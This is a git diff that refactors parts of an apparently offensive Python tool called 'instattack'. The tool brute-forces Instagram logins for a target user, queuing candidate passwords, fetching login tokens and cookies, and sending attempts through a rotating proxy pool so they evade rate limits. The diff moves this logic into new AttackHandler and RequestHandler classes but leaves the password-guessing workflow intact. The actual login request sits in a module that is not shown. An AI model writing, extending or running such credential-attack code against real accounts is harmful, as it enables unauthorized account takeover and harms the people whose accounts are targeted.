@@ -9,15 +9,15 @@ from instattack.config import config
 from instattack.lib.utils import (
     percentage, limit_as_completed, start_and_stop, break_before)
 
-from instattack.app.exceptions import NoPasswordsError
+from instattack.app.exceptions import (
+    NoPasswordsError, find_request_error, find_response_error)
+
 from instattack.app.mixins import LoggerMixin
-from instattack.app.proxies.broker import ProxyBroker
-from instattack.app.proxies.pool import ProxyPool
+from instattack.app.proxies import ProxyBroker, ProxyPool
 
 from .models import InstagramResults
 from .utils import get_token
 from .login import attempt
-from .exceptions import find_request_error, find_response_error
 
 
 """
@@ -55,7 +55,6 @@ class Handler(LoggerMixin):
     def __init__(self, loop, start_event=None, stop_event=None):
 
         self.loop = loop
-        self.user = self.loop.user
 
         self.start_event = start_event
         self.stop_event = stop_event
@@ -134,82 +133,26 @@ class ProxyHandler(Handler):
             })
 
 
-class LoginHandler(Handler):
-
-    __name__ = 'Login Handler'
+class RequestHandler(Handler):
 
     def __init__(self, loop, proxy_handler, **kwargs):
-        super(LoginHandler, self).__init__(loop, **kwargs)
+        super(RequestHandler, self).__init__(loop, **kwargs)
+
         self.proxy_handler = proxy_handler
-
-        self._cookies = None
-        self._token = None
-        self._scheduler = None
-
-        self.passwords = asyncio.Queue()
-        self.lock = asyncio.Lock()
-
-        # Temporary Try to See if Performance Affected
-        self.proxies_to_save = []
-        self.attempts_to_save = []
-
         self.num_completed = 0
-        self.num_passwords = 0  # Index for the current password and attempts per password.
+        self.proxies_to_save = []
 
-    async def attempt_single_login(self, password):
-        await self.passwords.put(password)
-        self.num_passwords = 1
-        results = await self.attempt_login(self.loop)
-        await self.finish_attack()
-        return results
-
-    async def attack(self, limit=None):
-        await self.prepopulate(limit=limit)
-        results = await self.attempt_login(self.loop)
-        await self.finish_attack()
-        return results
-
-    @break_before
-    async def finish_attack(self):
+    async def finish(self):
         """
         [x] TODO:
         --------
         Figure out a way to guarantee that this always gets run even if we hit
         some type of error.
         """
-        if config['attempts']['save_method'] == 'end':
-            with start_and_stop(f"Saving {len(self.attempts_to_save)} Attempts"):
-                tasks = [
-                    self.user.create_or_update_attempt(att[0], success=att[1])
-                    for att in self.attempts_to_save
-                ]
-                await asyncio.gather(*tasks)
-
         if config['proxies']['save_method'] == 'end':
             with start_and_stop(f"Saving {len(self.proxies_to_save)} Proxies"):
                 tasks = [proxy.save() for proxy in self.proxies_to_save]
                 await asyncio.gather(*tasks)
-
-    async def prepopulate(self, limit=None):
-        log = self.create_logger('prepopulate')
-
-        message = f'Generating All Attempts for User {self.user.username}.'
-        if limit:
-            message = (
-                f'Generating {limit} '
-                f'Attempts for User {self.user.username}.'
-            )
-        await log.start(message)
-
-        passwords = await self.user.get_new_attempts(self.loop, limit=limit)
-        if len(passwords) == 0:
-            raise NoPasswordsError()
-
-        self.num_passwords = len(passwords)
-        for password in passwords:
-            await self.passwords.put(password)
-
-        await log.success(f"Prepopulated {self.passwords.qsize()} Password Attempts")
 
     def connector(self, loop):
         return aiohttp.TCPConnector(
@@ -226,25 +169,6 @@ class LoginHandler(Handler):
         return aiohttp.ClientTimeout(
             total=config['connection']['timeout']
         )
-
-    @property
-    def token(self):
-        if not self._token:
-            raise RuntimeError('Token Not Found Yet')
-        return self._token
-
-    async def cookies(self):
-        if not self._cookies:
-            # TODO: Set timeout to the token timeout.
-            sess = aiohttp.ClientSession(connector=self.connector(self.loop))
-            self._token, self._cookies = await get_token(sess)
-
-            if not self._token:
-                raise RuntimeError('Could not find token.')
-
-            await sess.close()
-
-        return self._cookies
 
     async def on_proxy_request_error(self, proxy, e):
         err = find_request_error(e)
@@ -284,6 +208,99 @@ class LoginHandler(Handler):
         else:
             await self.schedule_task(proxy.save())
 
+
+class TrainHandler(RequestHandler):
+
+    __name__ = 'Train Handler'
+
+
+
+class AttackHandler(RequestHandler):
+
+    __name__ = 'Login Handler'
+
+    def __init__(self, *args, **kwargs):
+        super(AttackHandler, self).__init__(*args, **kwargs)
+
+        self.user = self.loop.user
+        self.passwords = asyncio.Queue()
+
+        self._cookies = None
+        self._token = None
+
+        self.attempts_to_save = []
+        self.num_passwords = 0
+
+    async def attempt_single_login(self, password):
+        await self.passwords.put(password)
+        self.num_passwords = 1
+        results = await self.attempt_login(self.loop)
+        await self.finish_attack()
+        return results
+
+    async def attack(self, limit=None):
+        await self.prepopulate(limit=limit)
+        results = await self.attempt_login(self.loop)
+        await self.finish_attack()
+        return results
+
+    async def finish(self):
+        """
+        [x] TODO:
+        --------
+        Figure out a way to guarantee that this always gets run even if we hit
+        some type of error.
+        """
+        await super(AttackHandler, self).finish()
+
+        if config['attempts']['save_method'] == 'end':
+            with start_and_stop(f"Saving {len(self.attempts_to_save)} Attempts"):
+                tasks = [
+                    self.user.create_or_update_attempt(att[0], success=att[1])
+                    for att in self.attempts_to_save
+                ]
+                await asyncio.gather(*tasks)
+
+    async def prepopulate(self, limit=None):
+        log = self.create_logger('prepopulate')
+
+        message = f'Generating All Attempts for User {self.user.username}.'
+        if limit:
+            message = (
+                f'Generating {limit} '
+                f'Attempts for User {self.user.username}.'
+            )
+        await log.start(message)
+
+        passwords = await self.user.get_new_attempts(self.loop, limit=limit)
+        if len(passwords) == 0:
+            raise NoPasswordsError()
+
+        self.num_passwords = len(passwords)
+        for password in passwords:
+            await self.passwords.put(password)
+
+        await log.success(f"Prepopulated {self.passwords.qsize()} Password Attempts")
+
+    @property
+    def token(self):
+        if not self._token:
+            raise RuntimeError('Token Not Found Yet')
+        return self._token
+
+    async def cookies(self):
+        if not self._cookies:
+            # TODO: Set timeout to the token timeout.
+            sess = aiohttp.ClientSession(connector=self.connector(self.loop))
+            self._token, self._cookies = await get_token(sess)
+
+            if not self._token:
+                raise RuntimeError('Could not find token.')
+
+            await sess.close()
+
+        return self._cookies
+
     async def login_task_generator(self, loop, session):
         """
         Generates coroutines for each password to be attempted and yields
@@ -315,9 +332,6 @@ class LoginHandler(Handler):
                 )
 
         await log.debug('Passwords Queue is Empty')
-
-    def attempt_sync_login(self, loop):
-        loop.run_until_complete(self.attempt_login(loop))
 
     async def attempt_login(self, loop):
         """
